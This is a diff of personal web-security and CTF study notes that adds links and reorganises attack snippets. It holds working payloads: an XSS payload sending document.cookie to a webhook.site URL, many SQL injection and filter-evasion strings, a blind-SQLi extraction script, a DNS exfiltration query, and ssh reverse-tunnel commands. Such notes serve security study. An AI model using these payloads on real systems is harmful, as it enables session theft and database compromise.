@@ -15,6 +15,7 @@
 - https://owasp.org/www-project-web-security-testing-guide/stable/
     - https://owasp.org/www-community/attacks/
     - https://cheatsheetseries.owasp.org/Glossary.html
+- https://pentester.land/list-of-bug-bounty-writeups.html
 - The Web Application Hacker's Handbook
 
 # labs
@@ -26,9 +27,16 @@
     - https://hub.docker.com/r/bkimminich/juice-shop
 - [IppSec \- HackTheBox Writeups](https://ippsec.rocks/)
 
+# domain names
+
+- https://www.freenom.com/en/index.html?lang=en
+- http://www.dot.tk/en/index.html?lang=en
+
 # information disclosure
 
-[Webhook\.site \- Test, process and transform emails and HTTP requests](https://webhook.site/)
+- [GitHub \- cure53/HTTPLeaks: HTTPLeaks \- All possible ways, a website can leak HTTP requests](https://github.com/cure53/HTTPLeaks)
+
+- [Webhook\.site \- Test, process and transform emails and HTTP requests](https://webhook.site/)
 
 ```python
 @app.route('/', methods=['GET', 'HEAD', 'POST'])
@@ -209,6 +217,8 @@ Clone:
     Origin: http://example.com`.hackxor.net/
     ```
 
+- [!] If server is down, request can fail with "Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at [...]"
+
 # Man-In-The-Middle (MITM)
 
 - Mitigation: Firefox: `security.mixed_content.block_active_content`
@@ -220,8 +230,9 @@ Clone:
     ```javascript
     // addData: ({ uid, data, type })
     database.addData({ type: 'link', ...req.body, uid });
+    
     // payload
-    {"data": "javascript: fetch(`https://requestbin.io/qykha7qy?data=${encodeURIComponent(document.cookie)}`)", "type": "link"}
+    {"data": "javascript: fetch(`https://webhook.site/d2522a84-184e-496f-9e29-60360577d4c4?data=${encodeURIComponent(document.cookie)}`)", "type": "link"}
     ```
 
 # command injection
@@ -346,6 +357,14 @@ curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.
     ```
 - https://www.netlify.com/blog/2018/09/13/how-to-run-express.js-apps-with-netlify-functions/
 - https://devcenter.heroku.com/articles/getting-started-with-nodejs
+- exposing local service
+    - https://ngrok.com/
+    ```bash
+    # publish
+    ssh exposed_host_namespace@ssh-j.com -N -R host_behind_nat:22:localhost:22
+    # connect
+    ssh -J exposed_host_namespace@ssh-j.com host_behind_nat
+    ```
 
 ### Reverse DNS checks
 
@@ -358,6 +377,7 @@ curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.
 
 ### DNS Rebind
 
+- [rbndr\.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html)
 - [DnsFookup](http://rbnd.gl0.eu/dnsbin)
     - record type = A; IP = 93.184.216.34; Repeat = 1
     - record type = A; IP = 127.0.0.1; Repeat = 1
@@ -603,37 +623,8 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 # SQL Injection (SQLI)
 
-~/code/src/security/PayloadsAllTheThings/SQL Injection/Intruder
-
-```
-' or 1=1 UNION SELECT database(),1 #
-' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = '' #
-
-User-Agent: ' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(1) #
-User-Agent: ' or 1 group by concat_ws(0x3a,(select group_concat(table_name separator ',') from information_schema.tables where table_schema=database()),floor(rand(0)*2)) having min(1) #
-
-%" UNION SELECT "one", "two"; --%";
-%" AND username in (SELECT username FROM sqlite_master where username like "%") --
-
--- Given 3 columns in table:
-telnet'	oorr	1=0	UNION	SELECT	*	FROM	(SELECT	1)	AS	a	JOIN	(SELECT	*	from	flag)	AS	b	JOIN	(SELECT	1)	AS	c;#
-
--- Error-based query: Output contains string "n1ctf"
--- WAF: preg_match("/get_lock|sleep|benchmark|count|when|case|rlike|count/i",$info)
--- ExtractValue(xml_frag, xpath_expr)
--- UpdateXML(xml_target, xpath_expr, new_xml)
-'&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=1 limit 1)))))&&'
--- ||
-'&&(select extractvalue(rand(),0x3a6e31637466))&&'
--- ERROR 1105 (HY000): XPATH syntax error: ':n1ctf'
--- ||
-'||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((select database()),1,1))=100,'n1ctf','r3kapig')),'~'),3))||'
--- ERROR 1105 (HY000): XPATH syntax error: '~n1ctf~'
-```
-- ~/share/ctf/n1ctf2020/web-signin/
-    - https://www.gem-love.com/ctf/2657.html#websignin
-    - https://eine.tistory.com/entry/n1ctf-2020-web-signIn-write-up
-    - https://github.com/Super-Guesser/ctf/tree/master/N1CTF%202020/web/signin
+- https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
+- ~/code/src/security/PayloadsAllTheThings/SQL Injection/Intruder
 
 ```bash
 sqlmap -u "http://joking.bitsctf.bits-quark.org/index.php" --data="id=1&submit1=submit" -D hack -T Joker -C Flag --dump
@@ -648,38 +639,94 @@ sqlmap.py -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a"
 sqlmap.py -u http://ctf.sharif.edu:8082/login.php --method=POST --data="username=a&password=b" -p username --technique=B --string injection --dbms=MySQL --risk=3 -D irish_home -T users --dump --prefix="aa\""
 ```
 
-Replace spaces with parenthesis:
+- Error-based
+    - ~/share/ctf/n1ctf2020/web-signin/
+    - https://www.gem-love.com/ctf/2657.html#websignin
+    - https://eine.tistory.com/entry/n1ctf-2020-web-signIn-write-up
+    - https://github.com/Super-Guesser/ctf/tree/master/N1CTF%202020/web/signin
+    ```
+    ' or 1=1 UNION SELECT database(),1 #
+    ' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = '' #
 
-```python
-import requests
-import string
+    User-Agent: ' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(1) #
+    User-Agent: ' or 1 group by concat_ws(0x3a,(select group_concat(table_name separator ',') from information_schema.tables where table_schema=database()),floor(rand(0)*2)) having min(1) #
 
-session = requests.session()
-url = "http://202.120.7.197/app.php"
-cookie = {"PHPSESSID": "ck8pgb52nkkb8sdg2c95ms7s16"}
-flag = ""
+    %" UNION SELECT "one", "two"; --%";
+    %" AND username in (SELECT username FROM sqlite_master where username like "%") --
 
-for i in xrange(1, 50):
-    for j in string.printable:
-        if j == "%": continue
-        param = {"action": "search", "keyword": "", "order": "if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{length},1)like({num}),price,name)".format(length=str(i), num=hex(ord(j)))}
-        # print param
-        res = session.get(url=url, params=param, cookies=cookie)
-        content = res.text
-        # print content
-        if content.find("\"id\":\"5\"") > content.find("\"id\":\"2\""):
-            print j
-            flag += j
-            print flag
-            break
-```
+    -- Given 3 columns in table:
+    telnet'	oorr	1=0	UNION	SELECT	*	FROM	(SELECT	1)	AS	a	JOIN	(SELECT	*	from	flag)	AS	b	JOIN	(SELECT	1)	AS	c;#
+
+    -- Error-based query: Output contains string "n1ctf"
+    -- WAF: preg_match("/get_lock|sleep|benchmark|count|when|case|rlike|count/i",$info)
+    -- ExtractValue(xml_frag, xpath_expr)
+    -- UpdateXML(xml_target, xpath_expr, new_xml)
+    '&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=1 limit 1)))))&&'
+    -- ||
+    '&&(select extractvalue(rand(),0x3a6e31637466))&&'
+    -- ERROR 1105 (HY000): XPATH syntax error: ':n1ctf'
+    -- ||
+    '||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((select database()),1,1))=100,'n1ctf','r3kapig')),'~'),3))||'
+    -- ERROR 1105 (HY000): XPATH syntax error: '~n1ctf~'
+    ```
+- WHERE alternative
+    - https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
+    ```
+    `?id=(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)))#`
+    `?id=1&&mid(pass,1,1)=(0x61);%00`
+    `?id=if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00`
+    ```
+- Replace spaces with comments
+    - `1/*foo*/and`, `sel/*foo*/ect`
+    - https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc
+- Replace spaces with parenthesis
+    - `?id=(1)and(1)=(0)union(select(null),mid(group_concat(table_name),600,100),(null)from(information_schema.tables))#`
+    - http://sla.ckers.org/forum/read.php?12,30425,page=10#msg-30696
     - https://www.40huo.cn/blog/0ctf-2017-writeup.html
+    ```python
+    import requests
+    import string
 
-- `mysqli::real_escape_string`
+    session = requests.session()
+    url = "http://202.120.7.197/app.php"
+    cookie = {"PHPSESSID": "ck8pgb52nkkb8sdg2c95ms7s16"}
+    flag = ""
+
+    for i in xrange(1, 50):
+        for j in string.printable:
+            if j == "%": continue
+            param = {"action": "search", "keyword": "", "order": "if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{length},1)like({num}),price,name)".format(length=str(i), num=hex(ord(j)))}
+            # print param
+            res = session.get(url=url, params=param, cookies=cookie)
+            content = res.text
+            # print content
+            if content.find("\"id\":\"5\"") > content.find("\"id\":\"2\""):
+                print j
+                flag += j
+                print flag
+                break
+    ```
+- `addslashes()`
+    - missing quotes around parameter
+        - => `sleep(30)`
+    - conditional with subqueries, union
+        - [\(The Unexpected SQL Injection\) Web Security Articles \- Web Application Security Consortium](http://www.webappsec.org/projects/articles/091007.shtml)
+    - unicode smuggling, wide byte injection: escaped quote interpreted as unicode char in app, but as quote in db
+        - => `bf 5c 27 == \xbf\\' == 뼧'`
+        - http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string
+        - http://www.comsecglobal.com/FrameWork/Upload/SQL_Smuggling.pdf
+- `htmlspecialchars(evil, ENT_QUOTES)`
+    - backslash escapes next quote
+        - `mysql_query("select * from users where name='".htmlspecialchars($_GET[name],ENT_QUOTES)."' and id='".htmlspecialchars($_GET[id],ENT_QUOTES)."'");`
+        - => `name=\&id=+or+sleep(30)/*`
+- `mysqli::real_escape_string()`
     - does not escape backtick, `--`
     - https://sasdf.github.io/ctf/writeup/2019/google/web/glotto/
+- DNS exfil
+    - `select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));`
+    - https://wiki.x10sec.org/web/sqli/
 
-- https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc
+- Mitigation: prepared statements, whitelisting
 
 # NoSQL Injection
 
@@ -690,14 +737,13 @@ for i in xrange(1, 50):
 
 # code injection
 
-On: state persisted as objects (e.g. cookie)
-
-```
-j:[{"id":1,"body":__FILE__}]
-j:[{"id":1,"body":["foo'"]}]
-```
+- On: state persisted as objects (e.g. cookie)
     - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#dusty-notes
         - https://artsploit.blogspot.com/2016/08/pprce2.html
+    ```
+    j:[{"id":1,"body":__FILE__}]
+    j:[{"id":1,"body":["foo'"]}]
+    ```
 
 # deserialization
 
@@ -762,33 +808,33 @@ nginx:
     ```
 - alternative for function call
     - https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/
-    ```javascript
-    window["a"]()
-    window["a"].apply(null, [1, 2, 3])
-    // typeof o = "string"
-    // o.constructor = String
-    // String.constructor = Function
-    (o=>o.constructor.constructor(
-        o.constructor.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101))())(Math+1)
-    ```
+        ```javascript
+        window["a"]()
+        window["a"].apply(null, [1, 2, 3])
+        // typeof o = "string"
+        // o.constructor = String
+        // String.constructor = Function
+        (o=>o.constructor.constructor(
+            o.constructor.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101))())(Math+1)
+        ```
     - [CTFtime\.org / Hack\.lu CTF 2020 / BabyJS](https://ctftime.org/task/13520)
-    ```
-    > y
-    'constructor'
-    > y[y]
-    [Function: String]
-    > y[y][y]
-    [Function: Function]
-    > z
-    'return e=>console.log(e)'
-    > y[y][y](z)
-    [Function: anonymous]
-    > y[y][y](z)()
-    [Function]
-    > y[y][y](z)()('foo')
-    foo
-    undefined
-    ```
+        ```
+        > y
+        'constructor'
+        > y[y]
+        [Function: String]
+        > y[y][y]
+        [Function: Function]
+        > z
+        'return e=>console.log(e)'
+        > y[y][y](z)
+        [Function: anonymous]
+        > y[y][y](z)()
+        [Function]
+        > y[y][y](z)()('foo')
+        foo
+        undefined
+        ```
 - [CTFtime\.org / Harekaze CTF 2019 / /\(a\-z\(\)\.\)/ / Writeup](https://ctftime.org/writeup/15376)
     - [Harekaze 2019 writeups by terjanq \(https://twitter\.com/terjanq\) · GitHub](https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72)
     ```javascript
@@ -897,20 +943,21 @@ nginx:
     http://a:.@✊nginx:80.:/flag.php
     // ACE = http://a:.xn--@nginx:80-5s4f.:/flag.php
     ```
-        - Alternative: DNS Rebinding
-        ```
-        GET /?url=http://ocu.chal.seccon.jp:10000/flag.php
-        ---
-        localhost.my_server A   (vulnerable_ip)
-        localhost.my_server A   (my_server_ip)
-        ---
-        GET /?url=http://localhost.my_server/flag.php
-        ```
-        - [CTFtime\.org / SECCON 2019 Online CTF / Option\-Cmd\-U](https://ctftime.org/task/9540)
+- Back slashes interpreted as forward slashes
+    - https://samcurry.net/abusing-http-path-normalization-and-cache-poisoning-to-steal-rocket-league-accounts/
     ```
     Location: https:\\foo.com/bar
     ```
-        - https://samcurry.net/abusing-http-path-normalization-and-cache-poisoning-to-steal-rocket-league-accounts/
+- DNS Rebinding
+    - [CTFtime\.org / SECCON 2019 Online CTF / Option\-Cmd\-U](https://ctftime.org/task/9540)
+    ```
+    GET /?url=http://ocu.chal.seccon.jp:10000/flag.php
+    ---
+    localhost.my_server A   (vulnerable_ip)
+    localhost.my_server A   (my_server_ip)
+    ---
+    GET /?url=http://localhost.my_server/flag.php
+    ```
 - DNS tunnel
     - https://github.com/iagox86/dnscat2
 - cache poisoning
